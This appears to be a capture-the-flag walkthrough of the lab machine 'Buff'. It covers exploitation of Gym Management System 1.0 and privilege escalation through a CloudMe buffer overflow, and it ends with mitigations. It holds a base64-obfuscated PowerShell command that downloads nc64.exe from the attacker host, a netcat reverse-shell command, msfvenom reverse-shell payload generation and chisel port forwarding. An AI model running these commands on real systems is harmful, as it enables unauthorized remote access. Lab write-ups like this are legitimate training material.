## Introduction

In this walkthrough, I tackled the Buff machine, which had an exposed Gym Management System 1.0 vulnerable to unauthenticated remote code execution. I exploited this flaw to gain initial access. Once inside, internal enumeration revealed a service running on port 8888. By locating its installation files on the disk, I was able to analyze and debug the service locally. I then used port forwarding to expose this internal service externally and successfully exploited it to advance further.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

## Web

### Port 8080

Version - Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)

## Exploitation

Accessing `Contact` page we can the version of the software.

I found the following exploit and using it got access to the target:

[Gym Management System 1.0 - Unauthenticated Remote Code Execution](https://www.exploit-db.com/exploits/48506)

```bash
python 48506.py 'http://10.10.10.198:8080/'
```

Now let’s get a reverse shell.

I did that transferring `nc64.exe` to the target first encoding powershell command to base64 and then using nc64.

```powershell
powershell -enc aQB3AHIAIAAtAHUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADIALwBuAGMANgA0AC4AZQB4AGUAIAAtAE8AdQB0AGYAaQBsAGUAIABuAGMANgA0AC4AZQB4AGUA
```

```powershell
C:\xampp\htdocs\gym\upload\nc64.exe 10.10.14.12 443 -e cmd
```

Now I have a normal shell:

## Privilege Escalation

While checking for my user home directory I found some application was installed to the target:

![image.png](image%207.png)

I think the following exploit might be apprpriate:

[CloudMe 1.11.2 - Buffer Overflow (PoC)](https://www.exploit-db.com/exploits/48389)

```bash
msfvenom -a x64 -p windows/x64/exec CMD="C:\\tools\\reverse.exe" -b '\x00\x0A\x0D' -f python
```

Exploit uses port 8888 which default port for that application, but it appears that port is accessible only locally so I am gonna make it accessible using port forwarding with chisel:

![image.png](image%208.png)

```bash
./chisel_1.10.1_linux_amd64 server --reverse --port 7680 -v #linux

.\chisel.exe client 10.10.14.12:7680 R:8888:127.0.0.1:8888 #target
```

[Chisel Reverse Port Forwarding](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel#bkmrk-reverse-local-port-t)

I got a connection but it is very slow:

![image.png](image%209.png)

That’s why I am gonna use reverse shell shellcode directly:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4444 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
```

## Mitigation

- Patch known vulnerabilities in third-party applications like Gym Management System.
- Limit access to internal services by implementing proper network segmentation.
- Remove unnecessary software and services from production systems.
- Regularly audit exposed ports and services to prevent unauthorized access.
- Use firewalls and access controls to restrict internal service exposure.
